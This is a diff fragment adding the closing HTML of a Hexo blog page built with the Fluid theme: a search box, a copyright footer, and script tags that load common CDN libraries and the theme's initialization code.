+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       copyright 2021 - 2024 & all rights reserved<br> <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>powered by hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>theme fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
